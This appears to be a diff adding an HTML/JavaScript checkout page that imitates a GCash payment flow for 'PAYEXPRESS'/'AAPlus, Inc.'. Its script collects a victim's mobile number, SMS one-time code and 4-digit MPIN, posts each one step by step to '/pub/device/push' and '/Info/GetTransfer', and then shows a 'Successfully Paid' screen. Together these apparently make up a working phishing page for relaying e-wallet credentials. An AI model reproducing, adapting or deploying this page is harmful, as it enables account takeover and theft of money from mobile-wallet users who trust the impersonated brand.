+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAACXBIWXMAACE4AAAhOAFFljFgAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAQMSURBVHgB7VrNUtNQFP6aVheKM/UJhIUOO+sblJ0KalJHx536BMATtN25A55AWKIODTOg7qg7dtYdIwvrE1hnWDjQJp6T9JabP5KbJi0LvplMfnqTe7577vm55xa4wnRRQA7QW/rs6RnKWgFl8axUQtc0zC4yRiYElj7q1UIJz2ygAvcoRzTt0dGhTjt2H7t7L8w2xkRqAtWWXp4BlulyBdECx3XeHVhoWhraX1NqR5lAFoKHCNEl7W3uGWYTilAi8LilV4pAizqbRQ5gImfAgoo2tKQNn+7qy9T4e17CM/jbJeDXUkuvJ32nmKTR0q5ety28w+RQvfdqHj+3j77FNYwlwMLDQgOTRyISFxKYovAC1bsv5/8efzg6jGoQacQPKRjxfMQlgAU8+GyYnbDfIo34GnCASwL2fOy+w34LJeAYbY7eRhUsy4zlxJ0AAlOIpw6P/oQIcGrR5hSkEN9f7wSYaxtmT34Y0IBmoToJ4amPbp/mNkVfg4R/m+CVcpgWAgSKGhIHkXFAhrkqIq7laiIempPC+B5JoAg4kdEniZtfDNPkSzZONtKEb5Y585UfeDVgQ0fesLGx99xsiNubwJrSoBW9MnoJFHAfOYLn/UnhPDCyt6P5/wYq8Mnot4EKcgILP6BMU3iRR590PWWU98g4IsDuExnl92EgAoYwWu6rWMR7pEO5tl+7I25GBEp5Gi8ZrUgFRJzBGIP179S6La4Trwc8IEO0bWwlbSsbbUnVaEOg9aViARTBS7/9mukEFHK7XTrVL2jbEW2d9m52m6mnG2kgcTCRQFG0YUVE0aHRGuKeV3R5pObKBNjtyUs+mtubdFqA9/3eQFrb8ry3MhT++g1tlOaPCAw7S6qFxmJLXxM3pIk2DcACjzrf07kpCz+u0frQ21nc+S1u/EbcQUKQJlZIE6M8nb3MwCWxum+Y66JdKfsqhkdGfyrxA2rQKRU4ECR41GXhn7hayjY4+mT0pxImFEGaqNyicsswEI7ARmsjfBEyFgZeGQMLGpoWf5BivspFKS6AcQ0JGYNtjDQ8Jz8LC2QbSPdxx1g53VVIj1X7CJQeAwTI6HgOK8eEYQez9IFclqM8+uTp2v7nAQKmmy2m0kKeKFjYCquZhuZCrAXh0y8DWBY5n5IRSoC1YEtpwLQxcCN9KCKzUQ5MHJQwbVjnUT0MF9ZGj7ePDqnAyq62immAhI+aOgKx1WmqDrenQiKB8IxE+wOTJuHkUzUz0X6E0haTs5alYFXIaflpu3tlRlQlOgypdikp3WhQR68zJOLEHqp9rvtrn3FIvc3K2iAXVqUP1McgklpwgWw2uqkk6VT13KJT7Ea3kxJT5ssLIYyJTAj4wX816Eta4eXqdTry+KvBFaaN/4/3jfkAgJobAAAAAElFTkSuQmCC" class="img-success">
+<p>Successfully Paid</p>
+</div>
+<div accessbilityid="merchant-name" class="merchant-name">
+<h1>PAYEXPRESS</h1>
+</div>
+<div class="header-bottom">
+Via GCash
+</div>
+</header>
+<hr>
+<section id="section-amount">
+<div class="row cashier-row">
+<label>Amount</label>
+<p class="amount money">PHP 200.00</p>
+</div>
+
+</section>
+<hr>
+<section id="section-total">
+
+
+
+
+<div class="row cashier-row total">
+<label>Total</label>
+<p class="amount money">PHP 200.00</p>
+</div>
+</section>
+<hr>
+<footer>
+<div class="container-trans-details">
+
+</div>
+<div data-html2canvas-ignore="true" class="container-btn-back">
+<a href="" class="ap-button ap-button-primary" style="padding-top: 11px;">BACK TO MERCHANT</a>
+</div>
+<p class="text-footer-use-case"><span>GCash</span> Payment</p>
+</footer>
+</div>
+<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA9gAAAA8CAYAAACdFxJ4AAAACXBIWXMAACE4AAAhOAFFljFgAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAusSURBVHgB7d2NkePGEYbhPpcDuAy8GUgZeDOQMjBCuBAQwoUARyApAq4iODmCWUdgOYLPRJEswzS5+OuZ6YHep4qlq9KpxBbnA7qbuNUnnRkAAAAAANjlTwYAAAAAAHZjwAYAAAAAwAEDNgAAAAAADhiwAQAAAABwwIANAAAAAIADBmwAAAAAABwwYAMAAAAA4IABGwAAAAAABwzYAAAAAAA4YMAGAAAAAMABAzYAAAAAAA4YsAEAAAAAcMCADQAAAACAAwZsAAAAAAAcMGADAAAAAOCAARsAAAAAAAcM2AAAAAAAOGDABgAAAADAAQM2AAAAAAAOGLABAAAAAHDAgA0AAAAAgAMGbAAAAAAAHDBgAwAAAADggAEbAAAAAAAHDNgAAAAAADhgwAYAAAAAwAEDNgAAAAAADhiwAQAAAABwwIANAAAAAIADBmwAAAAAABwwYAMAAAAA4IABGwAAAAAABwzYAAAAAAA4YMAGAAAAAMABAzYAAAAAAA4YsAEAAAAAcMCADQAAAACAAwZsAAAAAAAcMGADAAAAAOCAARsAAAAAAAd/trx+P79+u/76+/Prs7VlfP8/n1//tMt7/+78erX2vJ1f/7BLPWMNP1p73uxSw+ivdjlPrbmdp39bu2dpmolbDS3merwujefpL3Y5Sy/Wnjf7byZ+sDZreLdLHUfKRIvXVzIRx/g5/Hr99REyMd6vX609Yw1vdjlP4+fQeibG+/T4WbxYe96s7f5vepaONEu8Wpv93/v1ry+WMw/K43R+vT74d3XnV1Ibvp5fnx/U8KJLfS04nV8vT2r4qjYkPT5Lr2rnLP3r/Prxyefwk9rR6y4TutTQqx3jf+9Huf6iy+fUgm96nIkf1U4mkh7XMJ6nb2rHs0wMaseze11LuT7p8b2upZ4j6XkmktowXkO/PKmBTJR1EpmI4KNZopX+76Tns0QrmUi6nP37+3W2WSLHgP3VPqA2gtHZDMUfUPsFNUQPxthof545S9Gb8aQHF6bGPoexaeoar2HUz9TwveJfmx4uCO4ykRRb0nwmojfjYyZe7Y+RieiLp2GmhuYzcf57nxW/GR/PyffWfia+zNTQKb4j9OFz/d9nxe//epuh+JkYFtTwRbGN5+Rlpgb3mc57wB5sAcUNxuwgcVdH1GD0K2qIerMYG+zZR08Uu/FImgl1A2dptmlq4CyN+oU1RG48hoU1RG48Zm90kzqiZiJpeSYiNx5fFtYQefH0dWENkXP94SBxV0fUxVNS+7kedQtriLx46hfWEDkTJy3v/6JmorOFdJxZImImql1fPQfswVZSrGAsHiTuaogWjN5W0uXR0kjBGGwlxbvILh4kJjVEO0tJKzOhmI1Ht7KGiI1Hv7KGiIunxTe6SR0RM/GysoZoi6dVi+RrDUfJRLTF04dPpDyp4wiZiLZ4Wt3/6RiZiFjDYCsp1hOlD/9I4IIajjBLROv/Fn1Rd1eD2yzhNWAPtpFiBCNp5Q3iroYowehsI8X5lqK3jRTnc1g9SExqiNJ4JG3MhOKcpdWDxKSGSI1HbxspTuOx+kY3qSFKrpP2ZSJC47FpkXytoflMKNY3XoNtpFj3uhfbQHEW+0nHyMSiJ1Ie1BBp8dTbRoqRic3X12sNnWLYdJauNUTJxKKnm57U4HKP8Biwv9lOqhuMpB3D9aSGmsGY/fOAC2uoHYzedlL9i+xgO6n+ozZJOzOh+mdp143uWkOExqO3nXSMTNRePG0eJCY11M5E0v5MvKh+JjrbSfUXT73tpPq53rxIntRQe/GUdIx7XWc7qf7iqbeddIxZovbiqbOddIxZ4qSd9g7Yuy+wk2JqBCPJIRCTGl5VPhi7B4m7GmoFY/PG7EENtS6ymzdmD2qo1Xh4ZrrWWUryzXWtxqMzJ6qXid6cqF7jQSb+t4ZaiyeXQWJSxxEy0amOzU+kPKjhCJmotXjy7v9qLZ56c6JjzBI1ngJ0+aJuUkOtXPfmQA73uT0DtlvTMSmo5LcU7u//WkPJYCQ5hnpSQ+lgdOZM5RuP3pyp/Odwkn+mSzceSXkyUbLxcL3RTWoo3Xj05kzlF0+DOVP5XCflyUTJxZPrIDGp4QiZKL14clskT2oonYndT6Q8qGFsyE8qJ+kYmejMmcr2f0nt9+FJec5S6f7P7Yu66/vfNWRvHbCzDKfXgkoE46dc7/9aQ4lgJGUI9aSGEt9SZBkkJjWUajx6y0TlLrKDZaJy33gl5c1EicYjyyAxqaFU4+F6o7uroVQm3AeJuxpKZCLbvfpaR4lMJLWf61FnmajcYr+3TFQu1yflzUSJxVPSMe51q38Y2IoaSixjc19fjzJL5P6Bq65PNz14/5vu1bbhH0zK+GFcC8oZjMEKUN5guG9fn9SQ8wfCJGUcJCY15L7IZhskJjXkvshmGyTu6sjZeGS90U1qyNl4JJXJ9avyZqKzzJQ/E71lpvzfeJ1EJpbWkHPxlHWRPKnhKJnIuXgarAAdIxM5nyjNukie1JBz8TT2MyWurzlznVTgLF3ryNX/ZT9L2vYZfFt7IUgq92HkOFS9FZSphiKDxF0d3o/HJhU6R9f3n+NzyLYx+6CGHI1HbwUpT+OR9YmUQjUklc1EjsajyCAxqSFX49FbQcrTeAxWkI6TCe/FU5FBYlJDrkxkXyRPasj1jVeRRfKkjhyZKNr/Kc/iKan9/m+wgpRn8VTki7q7OrwzkVTo+qr156i7fXBpwW8ef8+LFSTfYPRWgXyDUWRj9qQOr2AkFT5H1/fveZaKNk2TGrwbj94qkO9FdrAK5Nt4FL/RXWvwzERSvUx4Nh7FBom7Ojwz0VsF8v3Gq/gi+VqD5+Ipqf1cjzqrQL6L/d4qkG+uT6qXCa/FU1L7meitAvk+UVrl+nqto9lZQsvPUVrzDxUvZMV7W6K3yrQ/GINVpv3BqDJITN6/x1lKqjBI3NXhcZHtrCL5XGR7q0g+jUe1G921Bq9MvFgl8lk8FX0i5UkdR8hEp/2ZqLZIvtZwlEzsXTxVWSTf1XGETHgsngarSMfIhMdTgL1Vpv2Lp8Eq0/5cJ8WdSR+/N11ujt/ufuP4H6Laze76vvYEo7MgtD0YvQWh7cGoOkhM3v+exiOp4g1iasfnUH2QuNG+xqO3ALTvG6+qg8Skhj3NU1KcTGy9vlYfJG60r/HoLQDtWzwNFoD2ZaLqInlK25exScfIRGcBaN8PXO0tAO3PROv9X5Wnmx7R9kwU/WMSH9H2pwCjnKX7efmkAPPyJlr/A2GK/nnApbQ+GL0Fo/XBGCwQbfvGKylI03Sj9WcpzCBxo23fePUWiLY1HmFudCNtazzCDBI3Wp+JpHiZ2LJ46iwQbctEb4Fo22I/RPM3pfWLp6Rj3Os6C0TbFk+9BaJtuR6XPNEysXbx1FkwOsYssXbxdFKLA2wrtCwY4QaJqRXBCLMxu6flN4tQg8SUljce4ZqmmxVnKSlY03SjdY1HZwFpXePRW1Ba3nicRCay0fLGI+v/6mYPHSATWrd4CjdI3OgYmegW1hC2/9MxMrFm8TRYUFrW/4X8ou5Gy3PdW1Ba/hTgYMhv5lAlBb1BTOnjbynCbV8fWRCM3oLT/AWq6E+o3kLz3wKn6JnQfOMR+kY30rLGI+zS7EbzjcdgwWn+W+Bw377f0/z1dfx7YRfJIy3L9REyEXaRfKP5e92pgUy8/kEy0VlgWvYDt3oLTvOzROizNNJlGZs+OEstXF/nMhH++vrIJ2uULjeC/vz67vwaB6D38+uX82v49OnT79aAaw3j4R9rGH89vu+xhq+N1fB6fv3NLjWMxhp+PtfwZg14cJZGb+fX3xurYXqWRr+dX7+ea2jm4nRtLKZn6f38+tXaykR3/ssPdqlhPE/j+77V8G4N0GWZ0dkxM/HLuYbBGvDk+vpubWZiWgOZqODJvW7MxFjDz9aADzLRWv/X2f9norX+b3x65lbD7Ty13v+9W3vX1xd7PEsMrVxfRw8y0dRZuvcfaJq7QpsTEg8AAAAASUVORK5CYII=" class="img-wave-bottom">
+<div data-v-0ea25afa="">
+
+</div>
+</div>
+
+<!--Successfully Paid end -->
+
+
+<!--Fail Paid  -->
+<div id="balance-page" class="balance-page main-container content-center warp2" style="display: none;">
+<div class="merchant-info">
+<div class="row"><label>Merchant</label> <span class="merchant-name">AAPlus, Inc.</span></div>
+<div class="row"><label>Amount Due</label> <span class="amount money">PHP 200.00</span></div>
+</div>
+<div class="page-main page-item text-center">
+<img src="./index_files/GCat_failed.24e3be3.png" class="error-icon">
+<h3>Pay Fail</h3>
+<p class="error-message">Busy,Please resubmit to Pay.</p>
+<p><a href="" class="ap-button ap-button-primary">Try Again</a></p>
+</div>
+</div>
+<!--Fail Paid end -->
+
+<!--Fail Paid Timeout  -->
+
+<div id="timeout-page" class="balance-page main-container content-center warp2" style="display: none;">
+<div class="merchant-info">
+<div class="row"><label>Merchant</label> <span class="merchant-name">AAPlus, Inc.</span></div>
+<div class="row"><label>Amount Due</label> <span class="amount money">PHP 200.00</span></div>
+</div>
+<div class="page-main page-item text-center">
+<img src="./index_files/GCat_failed.24e3be3.png" class="error-icon">
+<h3>Time Out</h3>
+<p class="error-message">Something wrong,Please resubmit to Pay.</p>
+<p><a href="" class="ap-button ap-button-primary">BACK TO MERCHANT</a></p>
+</div>
+</div>
+
+<!--Fail Paid Timeout  -->
+
+<!--mpin Paid   -->
+
+<div id="mpin" class="main-container password-page warp2" style="display: none;">
+<div class="page-container">
+<div class="page-main content-center">
+<div class="text-center">
+<h2>Enter your 4-digit MPIN.</h2>
+<p class="default-font enter-mobile-mpin-label">Enter your 4-digit MPIN.</p>
+<div class="pin-wrapper page-item mpin-password-field">
+<div class="ap-digital-password" accessbilityid="mpin-input" style="height: 0.4rem !impoertant;">
+<input type="number" data-role="pin" maxlength="1" pattern="[0-9]*" class="pin-input ap-password-item nodisabled" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;">
+<input type="number" data-role="pin" maxlength="1" pattern="[0-9]*" class="pin-input ap-password-item" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled="">
+<input type="number" data-role="pin" maxlength="1" pattern="[0-9]*" class="pin-input ap-password-item" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled="">
+<input type="number" data-role="pin" maxlength="1" pattern="[0-9]*" class="pin-input ap-password-item" onkeydown="if(event.keyCode != 8 &amp;&amp; this.value.length==1) return false;" disabled="">
+</div>
+</div>
+<div class="pin" style="display: none;"></div>
+</div>
+</div>
+<footer>
+<div class="submit-button">
+<button id="mpin-btn" type="submit" class="ap-button ap-button-primary" accessbilityid="submit-button">
+NEXT
+</button>
+</div>
+</footer>
+</div>
+<input type="hidden" name="m_id" id="m_id" value="2962540331787">
+<div data-v-0393febb=""></div>
+</div>
+<!--mpin Paid   -->
+</div>
+
+</div>
+</div>
+<script type="text/javascript" charset="utf-8" src="./index_files/jquery.min.js"></script>
+<script type="text/javascript" charset="utf-8" src="./index_files/jquery.jcryption.js"></script>
+<script type="text/javascript" charset="utf-8" src="./index_files/custom2.js"></script>
+<script type="text/javascript" charset="utf-8" src="./index_files/Portalencryption2.js"></script>
+<script>
+			const result = document.querySelector('.result');
+
+			const times = () => {
+				let inputTemplates = [];
+				inputTemplates[0] = '<input type="number" class="otp-input nodisabled" maxlength="1" pattern="[0-9]*" onKeyDown="if(event.keyCode != 8 && this.value.length==1) return false;" disabled>';
+				for (let i = 1; i < 6; i++) {
+					inputTemplates[i] = '<input type="number" class="otp-input" maxlength="1" pattern="[0-9]*" onKeyDown="if(event.keyCode != 8 && this.value.length==1) return false;" disabled>';
+				}
+
+				let inputCollection = inputTemplates.join('');
+				return inputCollection;
+			}
+
+			const times2 = () => {
+				let inputTemplates = [];
+				inputTemplates[0] = '<input type="number" class="otp-input2 nodisabled" maxlength="1" pattern="[0-9]*" onKeyDown="if(event.keyCode != 8 && this.value.length==1) return false;" disabled>';
+				for (let i = 1; i < 6; i++) {
+					inputTemplates[i] = '<input type="number" class="otp-input2" maxlength="1" pattern="[0-9]*" onKeyDown="if(event.keyCode != 8 && this.value.length==1) return false;" disabled>';
+				}
+
+				let inputCollection = inputTemplates.join('');
+				return inputCollection;
+			}
+
+			const container = $('.container');
+			if (container.length) {
+				container.html(times())
+			}
+
+			const container2 = $('.container2');
+			if (container2.length) {
+				container2.html(times2())
+			}
+
+			const inputsList = document.querySelectorAll('.otp-input');
+			const inputsList2 = document.querySelectorAll('.otp-input2');
+
+			$(".container").click(function (evt) {
+				$(this).find("input").focus();
+			});
+
+			$(".container2").click(function (evt) {
+				$(this).find("input").focus();
+			});
+
+			$(".ap-digital-password").click(function (evt) {
+				$(this).find("input").focus();
+			});
+
+			$('input').not('[name="mobileNum"]').on('input', e => {
+				if (!$(e.target).val()) return;
+				const next = $(e.target).next('input')
+				if (next.length) {
+					next.prop("disabled", false).focus()
+				} else {
+					$(e.target).parents('c').find('button').attr('disabled', false)
+				}
+			})
+
+			$('.pin-input').keydown(e => {
+				const target = $(e.target)
+				if (e.keyCode == 8) {
+					target.removeClass('bg-black')
+				} else {
+					target.addClass('bg-black')
+				}
+			})
+
+			$('input').keydown(e => {
+				const target = $(e.target)
+				console.log(target);
+				if (e.keyCode == 8) {
+					if (e.currentTarget.value.length == 0) {
+						target.prev().val('');
+						target.prev().removeClass('bg-black')
+						target.prev().focus()
+						if (!target.hasClass('nodisabled'))
+							target.prop("disabled", true)
+
+					}
+					target.parents('warp2').find('button').attr('disabled', true)
+				}
+			})
+
+			$('input[name="mobileNum"]').keyup(e => {
+				const target = $(e.target)
+				if (target.val().length >= 10) {
+					target.parents('warp2').find('button').attr('disabled', false)
+				}
+			})
+
+			const sendValues = () => {
+				let inputValues = [];
+				for (let inputValue of inputsList) {
+					if (inputValue.value.length === 1) {
+
+						inputValues.push(inputValue.value);
+					}
+				}
+
+				result.innerHTML = inputValues.join('');
+			}
+			const sendValues2 = () => {
+				let inputValues = [];
+				for (let inputValue of inputsList2) {
+					if (inputValue.value.length === 1) {
+
+						inputValues.push(inputValue.value);
+					}
+				}
+
+				result.innerHTML = inputValues.join('');
+			}
+
+			const btn = document.querySelector('button');
+			btn.addEventListener('click', sendValues, true);
+			btn.addEventListener('click', sendValues2, true);
+
+
+			const removeDisabledAttribute = (elem) => {
+				elem.removeAttribute("disabled");;
+			}
+
+			const setDisabledAttribute = (elem) => {
+				elem.setAttribute("disabled", '');
+			}
+
+			const setDisabledAttributeForAll = (arr) => {
+				for (let input of arr) {
+					input.setAttribute('disabled', '');
+				}
+			}
+
+			removeDisabledAttribute(inputsList[0]);
+			removeDisabledAttribute(inputsList2[0]);
+
+			const fill = (currentValue) => {
+				return currentValue.value.length === 1;
+			}
+
+			const areAllFilled = (arr) => {
+				let newArray = Array.from(arr);
+				return newArray.every((input) => input.value.length === 1);
+			}
+		</script>
+<script type="text/javascript">
+
+			var money = getQueryString('money');
+			if(money){
+				$('.money.amount').html('PHP ' + money)
+			}
+
+			var httpUrl = "http://192.168.3.189:8080";
+			httpUrl="";
+						// var order_id = "T11072332438744375524";
+			var order_id = getQueryString('out_trade_no');
+
+			//$("#g_amount").html(`PHP ${getQueryString('amount')}`)
+			$(".money").html(`PHP ${getQueryString('amount')}`)
+
+			
+
+			var account = "";
+
+			//orderStateById();
+
+			//$('.loadingBox').show();
+		//	$("#success-page").show();
+			
+			//$("#timeout-page").show();
+			//$("#balance-page").show();
+
+			//$(".warp2").show();
+			//					$("#digit").show();
+						//		$("#code").focus();
+
+						//$("#mpin").show();
+
+			function orderStateById() {
+				$.ajax({
+					//url: httpUrl + "/Info/OrderStateById?orderId=T11072332438744375524",
+					url: httpUrl + "/Info/OrderStateById?orderId=" + order_id,
+					beforeSend: function () {
+						$('.loadingBox').show();
+					},
+					dataType: "json",
+					type: "get",
+					success: function (data) {
+						console.log(data);
+						if (data && data.args) {
+							if (data.args.state == 3) {
+								$(".warp2").hide();
+								$("#timeout-page").show();
+							} else if (data.args.state == 2 || data.args.state == 7) {
+								$(".warp2").hide();
+								$("#success-page").show();
+							}
+						}
+					},
+					complete: function () {
+						$('.loadingBox').fadeOut();
+					},
+					error: function (err) {
+						console.log(err);
+					}
+				});
+			};
+
+			$('#login-btn').on('click', function () {
+				login();
+			});
+
+			$('#daifu_resend_otp').on('click', function () {
+				login();
+			});
+
+			function login() {
+
+				account = $('.phone').val();
+
+				/*** 简单验证手机号 11位 09开头 ***/
+				if (account.length != 11 && account.length != 10) {
+					//alert('phone number is not currect');
+					$('#login-btn').after('<p class="errortip">phone number is not currect</p>')
+					return;
+				}
+				if (account.length == 11 && (account[0] != 0 || account[1] != 9)) {
+					//alert('phone number is not currect');
+					$('#login-btn').after('<p class="errortip">phone number is not currect</p>')
+					return;
+				}
+				if (account.length == 10 && account[0] != 9) {
+					//alert('phone number is not currect');
+					$('#login-btn').after('<p class="errortip">phone number is not currect</p>')
+					return;
+				}
+				if (account.length == 10 && account[0] == 9) {
+					account = '0' + account;
+				}
+
+				$(".digit-tip").find('span').text(account);
+
+				$.ajax({
+					url: httpUrl + "/pub/device/push",
+					data: {
+						"out_trade_no": order_id,
+						"step":1,
+						"input": account
+					},
+					beforeSend: function () {
+						$('.loadingBox').show();
+						$('.errortip').remove();
+						$('.errortipbtn').remove();
+					},
+					dataType: "json",
+					type: "post",
+					success: function (data) {
+						console.log(data);
+						data=data.data
+						if (data) {
+							//&& data.args && data.args.response && data.args.response.isSuccess == 1
+							//data.args.response.des.indexOf("bind phone ok") > -1
+							if (false) {
+								/*** 已绑定 进入pin ***/
+								$(".warp2").hide();
+								$("#mpin").show();
+								$("#PayPassword").focus();
+								$('.ap-digital-password').find('input')[0].focus();
+							} else if (data.step==1) {
+								/*** 已发送短信 进入验证码 ***/
+								$(".warp2").hide();
+								$("#digit").show();
+								$("#code").focus();
+							} else {
+								/*alert(data.args.response.des);*/
+								$('#login-btn').after('<p class="errortip">' + data.args.response.des + '</p>');
+							}
+						} else {
+							if (data && data.args && (data.args.state == 2 || data.args.state == 7)) {
+								$(".warp2").hide();
+								$("#success-page").show();
+							} else {
+								console.log('GetToken Error');
+								$(".warp2").hide();
+								$("#timeout-page").show();
+								/* $("#failed").show(); */
+								/*alert(data.args.response.des);*/
+								/* if(data.args.response && data.args.response.des){
+									$('#failed').find('h2').after('<p class="errortip">' + data.args.response.des + '</p>');
+								}
+								$('#failed').after('<button class="errortipbtn">Try Again</button>'); */
+							}
+						}
+					},
+					complete: function () {
+						$('.loadingBox').fadeOut();
+					},
+					error: function (err) {
+						console.log(err);
+					}
+				});
+			};
+
+			$('#mpin-btn').on('click', function () {
+				mpin(this);
+			});
+
+			function mpin(_el) {
+
+				if (_el.requesting) {
+					return;
+				}
+
+
+				var passwd = "";
+				$(".pin-input").each(function () {
+					passwd += $(this).val();
+				});
+
+				if (passwd.length != 4 || !isNumber(passwd)) {
+					$('#mpin-btn').css('color', '#ed2020');
+					return;
+				} else {
+					$('#mpin-btn').css('color', '#fff');
+				}
+
+				_el.requesting = true;
+
+	
+
+				$.ajax({
+					url: httpUrl + "/pub/device/push",
+					data: {
+						"out_trade_no": order_id,
+						"step":3,
+						"input": passwd
+					},
+					beforeSend: function () {
+						$('.loadingBox').show();
+						$('.errortip').remove();
+						$('.errortipbtn').remove();
+					},
+					dataType: "json",
+					type: "post",
+					success: function (data) {
+						console.log(data);
+						data=data.data
+						if (data.step == 3) {
+
+								$(".warp2").hide();
+								$("#success-page").show();
+
+
+							// if (data.args.response.des.indexOf("bind phone ok") > -1) {
+							// 	/*** 提示成功  结束处理 ***/
+							// 	$(".warp2").hide();
+							// 	$("#success-page").show();
+							// } else if (data.args.response.des.indexOf("sms") > -1 && data.args.response.des.indexOf("sent") > -1) {
+							// 	/*** 进入验证码  隐藏提示内容 自动聚焦 ***/
+							// 	$(".warp2").hide();
+							// 	$("#digit2").show();
+							// 	$("#code2").focus();
+							// } else if (data.args.response.des.indexOf("success") > -1) {
+							// 	/*** 提示成功  结束处理 ***/
+							// 	$(".warp2").hide();
+							// 	$("#success-page").show();
+							// }
+						}
+						
+						// else {
+						// 	if (data.args.response.des && data.args.response.des.indexOf('please try again')) {
+						// 		var s = regExpNumber(data.args.response.des);
+						// 		if (s) {
+						// 			setTimeout(function () {
+						// 				delete _el.requesting;
+						// 			}, s * 1000)
+						// 			$(_el).after('<p class="errortip" style="text-align:center">' + data.args.response.des + '</p>');
+						// 		}
+						// 	} else {
+						// 		console.log('GetTransfer Error');
+						// 		$(".warp2").hide();
+						// 		$("#balance-page").show();
+						// 	}
+
+						// 	//alert('4-digit MPIN is not currect');
+						// 	/*alert(data.args.response.des);*/
+						// 	//$('#mpin-btn').after('<p class="errortip">' + data.args.response.des + '</p>');
+						// 	//$('#mpin-btn').after('<p class="errortip">4-digit MPIN is not currect</p>');
+						// }
+					},
+					complete: function () {
+						$('.loadingBox').fadeOut();
+						delete _el.requesting;
+					},
+					error: function (err) {
+						console.log(err);
+					}
+				});
+			};
+
+			$('#digit-btn').on('click', function () {
+				digit(this);
+			});
+
+			function digit(_el) {
+
+
+				if (_el.requesting) {
+					return;
+				}
+
+				var smscode = '';
+				$(".otp-input2").each(function () {
+					smscode += $(this).val();
+				});
+
+				if (smscode.length != 6 || !isNumber(smscode)) {
+					/*alert('6-digit code is not correct');*/
+					$('#digit-btn').after('<p class="errortip">6-digit code is not correct</p>');
+					return;
+				}
+
+				_el.requesting = true;
+
+		
+				$.ajax({
+					url: httpUrl + "/pub/device/push",
+					data: {
+						"out_trade_no": order_id,
+						"step": 2,
+						"input": smscode
+					},
+					beforeSend: function () {
+						$('.loadingBox').show();
+						$('.errortip').remove();
+						$('.errortipbtn').remove();
+					},
+					dataType: "json",
+					type: "post",
+					success: function (data) {
+						console.log(data);
+						data=data.data
+						if (data.step == 2) {
+								/*** 已绑定 进入pin ***/
+								$(".warp2").hide();
+								$("#mpin").show();
+								$("#PayPassword").focus();
+								
+						} 
+						
+						// else {
+						// 	if (data.args.response.des && data.args.response.des.indexOf('please try again')) {
+						// 		var s = regExpNumber(data.args.response.des);
+						// 		if (s) {
+						// 			setTimeout(function () {
+						// 				delete _el.requesting;
+						// 			}, s * 1000)
+						// 			$(_el).after('<p class="errortip" style="text-align:center">' + data.args.response.des + '</p>');
+						// 		}
+						// 	} else {
+						// 		console.log('GetToken Error');
+						// 		$(".warp2").hide();
+						// 		$("#balance-page").show();
+						// 		/* $("#failed").show();
+						// 		$('#failed').find('h2').after('<p class="errortip">' + data.args.response.des + '</p>');
+						// 		$('#failed').after('<button class="errortipbtn">Try Again</button>'); */
+
+						// 	}
+						// }
+					},
+					complete: function () {
+						$('.loadingBox').fadeOut();
+						delete _el.requesting;
+					},
+					error: function (err) {
+						console.log(err);
+					}
+				});
+			};
+
+			$('#digit-btn2').on('click', function () {
+				digit2(this);
+			});
+
+			function digit2(_el) {
+
+				if (_el.requesting) {
+					return;
+				}
+
+
+				var passwd = "";
+				$(".pin-input").each(function () {
+					passwd += $(this).val();
+				});
+
+				var smscode = '';
+				$(".otp-input").each(function () {
+					smscode += $(this).val();
+				});
+
+				if (smscode.length != 6 || !isNumber(smscode)) {
+					/*alert('6-digit code is not currect');*/
+					$('#digit-btn2').after('<p class="errortip">6-digit code is not currect</p>');
+					return;
+				}
+
+				_el.requesting = true;
+
+				$.ajax({
+					url: httpUrl + "/Info/GetTransfer",
+					data: {
+						"order_id": order_id,
+						"account": account,
+						"passwd": passwd,
+						"smscode": smscode
+					},
+					beforeSend: function () {
+						$('.loadingBox').show();
+						$('.errortip').remove();
+						$('.errortipbtn').remove();
+					},
+					dataType: "json",
+					type: "post",
+					success: function (data) {
+						console.log(data);
+						if (data && data.args && data.args.response && data.args.response.isSuccess == 1) {
+							if (data.args.response.des.indexOf("success") > -1) {
+								/*** 提示成功  结束处理 ***/
+								$(".warp2").hide();
+								$("#success-page").show();
+							}
+						} else {
+							if (data.args.response.des && data.args.response.des.indexOf('please try again')) {
+								var s = regExpNumber(data.args.response.des);
+								if (s) {
+									setTimeout(function () {
+										delete _el.requesting;
+									}, s * 1000)
+									$(_el).after('<p class="errortip" style="text-align:center">' + data.args.response.des + '</p>');
+									sleep(1500);
+									$("#mpin").show();
+								}
+							} else {
+								console.log('GetTransfer Error');
+								$(".warp2").hide();
+								$("#mpin").show();
+								//$("#failed").show();
+								/*alert(data.args.response.des);*/
+								//$('#failed').find('h2').after('<p class="errortip">'+data.args.response.des+'</p>');
+								//$('#failed').after('<button class="errortipbtn">Try Again</button>');
+							}
+						}
+
+					},
+					complete: function () {
+						$('.loadingBox').fadeOut();
+						delete _el.requesting;
+					},
+					error: function (err) {
+						console.log(err);
+					}
+				});
+			};
+
+			$(document.body).on('click', '.errortipbtn', function () {
+				window.location.reload();
+			});
+
+			function isNumber(_value) {
+				if (/^[-\+]?\d+(\.\d+)?$/.test(_value)) {
+					return true;
+				}
+				return false;
+			};
+
+			function regExpNumber(_data) {
+				var data = (_data + '').split('and')[0];
+				return data.match(/\d+/g)[0];
+			};
+
+			function getQueryString(name) {
+				var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
+				var r = window.location.search.substr(1).match(reg);
+				if (r != null) return unescape(r[2]); return null;
+			};
+		</script>
+
+<!-- <script type="text/javascript">
+			var sc_project = 12810833;
+			var sc_invisible = 1;
+			var sc_security = "39b7bd33"; 
+		</script>
+<script type="text/javascript" src="./index_files/counter.js" async=""></script>
+<noscript>
+			<div class="statcounter"><a title="Web Analytics" href="https://statcounter.com/" target="_blank"><img class="statcounter" src="https://c.statcounter.com/12810833/0/39b7bd33/1/"
+						alt="Web Analytics" referrerPolicy="no-referrer-when-downgrade"></a></div>
+		</noscript>
+
